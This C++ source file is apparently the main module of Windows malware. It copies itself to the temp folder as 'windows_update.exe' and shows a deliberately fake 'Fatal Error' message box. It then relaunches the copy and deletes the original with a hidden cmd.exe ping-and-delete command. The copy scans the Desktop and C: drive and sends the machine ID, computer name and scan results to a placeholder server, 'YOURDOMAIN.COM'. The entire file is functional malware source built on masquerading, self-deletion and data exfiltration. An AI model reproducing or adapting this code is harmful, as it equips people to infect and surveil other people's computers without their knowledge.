/****************************************************************************\
* Created: 1/9/2018 by Ali Sepehri-Amin
* Version: 0.9.0000
* Copyright © Tehranbytes Team.
* History: -
* Description: -
\****************************************************************************/

#include <Windows.h>
#include <iostream>
#include <string> // std::to_string
#include <lmon.h>
#include <fstream>
#include "Scanner.h"
#include "Notifier.h"

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 1 > Nul & Del \"%s\"")

std::string StrToUTF8(const std::wstring &wstr)
{
	if (wstr.empty()) 
		return std::string();

	// Maps a UTF-16 (wide character) string to a new character string 
	// The new character string is not necessarily from a multibyte character set 

	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
	std::string strTo(size_needed, 0);
	WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
	return strTo;
}

WCHAR* UTF8ToStr(const char* str)
{
	int str_len = (int)strlen(str);
	int num_chars = MultiByteToWideChar(CP_UTF8, 0, str, str_len, NULL, 0);
	WCHAR* wstrTo = (WCHAR*)malloc((num_chars + 1) * sizeof(WCHAR));
	if (wstrTo)
	{
		MultiByteToWideChar(CP_UTF8, 0, str, str_len, wstrTo, num_chars);
		wstrTo[num_chars] = L'\0';
	}
	return wstrTo;
}

/* Delete after runs instance process */
void SelfDelete()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}

bool IsFileExist(const char *fileName)
{
	std::ifstream infile(fileName);
	return infile.good();
}

VOID RunInstance(LPWSTR lpPath)
{
	// additional information
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// set the size of the structures
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// start the program up
	CreateProcess(lpPath,   // the path
		NULL,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
	);

	// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

int _tmain(int argc, TCHAR *argv[])
{
	FreeConsole();

	int founded = 0;

	TCHAR tempPath[MAX_PATH];
	GetTempPath(MAX_PATH, tempPath);
	std::wstring wsTemp(&tempPath[0]);
	std::string sTemp(wsTemp.begin(), wsTemp.end());
	//std::wcout << tempPath;
	std::string newCurrentDir = sTemp + "\\windows_update.exe";

	// If instance is not copied yet
	if (!IsFileExist(newCurrentDir.c_str()))
	{
		if (CopyFile(L"dig.exe", UTF8ToStr(newCurrentDir.c_str()), FALSE))
		{
			// Just a Fake error message
			MessageBox(0, L"Error: Cannot extract the contents. Code 0x82156 file is missing.\nExiting process...", L"Fatal Error", MB_OK | MB_ICONERROR);
			RunInstance(UTF8ToStr(newCurrentDir.c_str()));
			SelfDelete();
		}
	}
	else
	{
		std::string sendParam, id, machine, status, s_founded;

		// Look physical drive for a file
		// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
		// START SCAN
		// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-

		CScanner cscan;
		
		// Get Username and then desktop path
		TCHAR username[UNLEN + 1];
		DWORD usernameLength = UNLEN + 1;
		GetUserName(username, &usernameLength);
		std::wstring wsUsername(&username[0]);
		std::string sUsername(wsUsername.begin(), wsUsername.end());

		std::string desktopPath = "C:\\Users\\" + sUsername + "\\Desktop";
		//std::string downloadsPath = "C:\\Users\\" + sUsername + "\\Downloads";
		//std::string documentsPath = "C:\\Users\\" + sUsername + "\\Documents";

		// First Scan Desktop\Downloads\Documents Folder
		founded = cscan.ScanFile(UTF8ToStr(desktopPath.c_str()), status);
		//founded += cscan.ScanFile(UTF8ToStr(downloadsPath.c_str()), status);
		//founded += cscan.ScanFile(UTF8ToStr(documentsPath.c_str()), status);

		// All other drives
		DWORD cchBuffer;
		WCHAR* driveStrings;
		UINT driveType;
		PWSTR driveTypeString;

		// Find out how big a buffer we need
		cchBuffer = GetLogicalDriveStrings(0, NULL);

		driveStrings = (WCHAR*)malloc((cchBuffer + 1) * sizeof(TCHAR));
		if (driveStrings == NULL)
		{
			return -1;
		}

		// Fetch all drive strings    
		GetLogicalDriveStrings(cchBuffer, driveStrings);

		// Loop until we find the final '\0'
		// driveStrings is a double null terminated list of null terminated strings)
		wchar_t * singleDriveString = driveStrings;
		while (*singleDriveString)
		{
			// Dump drive information
			driveType = GetDriveType(singleDriveString);
			std::string strTemps;
			switch (driveType)
			{
			case DRIVE_FIXED:
				// It's hard disk drive
				strTemps = StrToUTF8(singleDriveString);
				if (strTemps == "C:\\")
				{
					founded = cscan.ScanFile(singleDriveString, status);
				}
				break;

			case DRIVE_REMOVABLE:
				// Removable
				break;

			case DRIVE_CDROM:
				// CD/DVD
				break;

			case DRIVE_REMOTE:
				// NETWORK | SHARE
				break;
			}

				// Move to next drive string
				// +1 is to move past the null at the end of the string.
			singleDriveString += lstrlen(singleDriveString) + 1;
		}


		// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
		// END SCAN
		// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-


		// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
		// START SERVER SIDE
		// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-

		CNotifier cnot;

		// Get UNIQUE hardware ID
		short macAddress1, macAddress2;
		int ID;
		cnot.GetMacHash(macAddress1, macAddress2);
		ID = macAddress1 + macAddress2;

		// Get Machine name
		TCHAR  infoBuf[32767];
		DWORD  bufCharCount = 32767;
		GetComputerName(infoBuf, &bufCharCount);
		std::wstring wsInfoBuf(&infoBuf[0]);


		// Parameters
		id = std::to_string(ID);
		machine = StrToUTF8(wsInfoBuf);
		s_founded = std::to_string(founded);
		sendParam = "/users.php?ID=" + id + "&MACHINE=" + machine + "&STATUS=" + status + "&FOUNDED=" + s_founded;

		// Send Data to Server
		cnot.HttpRequest(1, "YOURDOMAIN.COM", sendParam.c_str(), NULL, NULL);

		// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
		// END SERVER SIDE
		// +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-

		free(driveStrings);
	}
	return 0;
}

